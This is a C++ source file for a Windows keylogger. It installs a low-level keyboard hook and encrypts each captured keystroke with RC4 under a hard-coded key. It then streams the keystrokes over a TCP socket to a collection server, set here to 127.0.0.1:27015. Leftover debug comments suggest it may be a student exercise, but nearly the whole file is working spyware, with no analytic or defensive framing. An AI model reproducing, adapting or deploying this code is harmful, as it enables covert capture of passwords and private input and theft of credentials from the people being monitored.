#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x501
#define BUF_SIZE 512
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include<windows.h>
#include<iostream>
#include<stdio.h>

//#include <windows.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"
using namespace std;
 SOCKET ConnectSocket;
int iResult;
int count=0;
char key[14]={'h','a','c','k','e','r','n','e','v','e','r','d','i','e'};
int keyLength=14;
//char key[8]={'N','i','c','e','N','C','T','U'};
//int keyLength=8;
unsigned char s[256];
unsigned int j=0;
unsigned char k;
void KSA(){
    int j=0;
    for(int i=0;i<256;i++){
        s[i]=i;
    }
    for(int i=0;i<256;i++){
        j=((j+s[i]+key[i%keyLength])%256);
        swap(s[i],s[j]);
    }
}
void PRGA(){
    //char k;
    count=((count+1)%256);
    j=((j+s[count])%256);
  //  cout<<"j: "<<j<<endl;
    //system("pause");
    swap(s[count],s[j]);
    //system("pause");
    k=s[((s[count]+s[j])%256)];

    //system("pause");
    //return k;
}
char RC4(char a){
    char ans;
    //printf("k: %d",k);
    PRGA();
    ans=(a^k);

    return ans;
    //count=((count+1)%256);
}
char a;
FILE* output;
void sendData(char a);
LRESULT WINAPI Handle(int code , WPARAM w,LPARAM l)
{
    KBDLLHOOKSTRUCT* kbhook = (KBDLLHOOKSTRUCT *)l;

    int b;
    //char c;
	switch(w)
	{
    case WM_KEYDOWN:
        a=kbhook->vkCode;// a is the char I want to hook
        //cout<<"origin: "<<a<<endl;
        a=RC4(a);
        //cout<<"encryped: "<<a<<endl;
        //printf("encryped: a: %x\n",a);
        sendData(a);
        //cout<<"vk code:"<<a<<endl;
        //fprintf(output,"%c",a);
        //cout<<"=========================="<<endl;
        break;
    case WM_SYSKEYUP:;

	}
	return CallNextHookEx(NULL,code,w,l);


}
///////////////////////////new
/*DWORD WINAPI*/

void sendData(/*LPVOID lpParam*/char a){
    //a='a';
    //char sendbuf[1] = "9817059";// send the message here
    iResult = send( ConnectSocket, &a, (int)sizeof(a), 0 );

    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        exit(1);
    }

    //printf("Bytes Sent: %ld\n", iResult);


    //iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        exit(1);
    }
}
DWORD WINAPI receiveData(LPVOID lpParam){
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
     do {
        iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
        if ( iResult > 0 ){
            printf("Bytes received: %d\n", iResult);
            printf("str: %s\n", recvbuf);
            return 0;
        }
        else if ( iResult == 0 )
                printf("Connection closed\n");
        else
            printf("recv failed with error: %d\n", WSAGetLastError());

    } while( iResult > 0 );
}


int __cdecl main()
{
    WSADATA wsaData;
    ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;
    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;//tcp
    hints.ai_protocol = IPPROTO_TCP;//tcp

    // Resolve the server address and port
    iResult = getaddrinfo("127.0.0.1", DEFAULT_PORT, &hints, &result);
    if ( iResult != 0 ) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Attempt to connect to an address until one succeeds
    for(ptr=result; ptr != NULL ;ptr=ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }
    KSA();

        //cout<<"jdkfjlsjkdflsjf"<<endl;
    HHOOK hMouseHook= SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Handle,GetModuleHandle(NULL),0);
    //cout<<"a";ue
    //system("pause");
    //////////////////////////////////////



    MSG msg;

    while(GetMessage(&msg,NULL,0,0)!=0)
	{          //cout<<"dfjshkjdsfhkjdsfhkfsd"<<endl;
               if (msg.message == WM_HOTKEY)
               {
                  cout<<UnhookWindowsHookEx(hMouseHook);
                  return 0;
               }
               //Translates virtual-key messages into character messages.
               TranslateMessage(&msg);
               //Dispatches a message to a window procedure.
               DispatchMessage(&msg);
	}
    closesocket(ConnectSocket);
    WSACleanup();

    return 0;
}
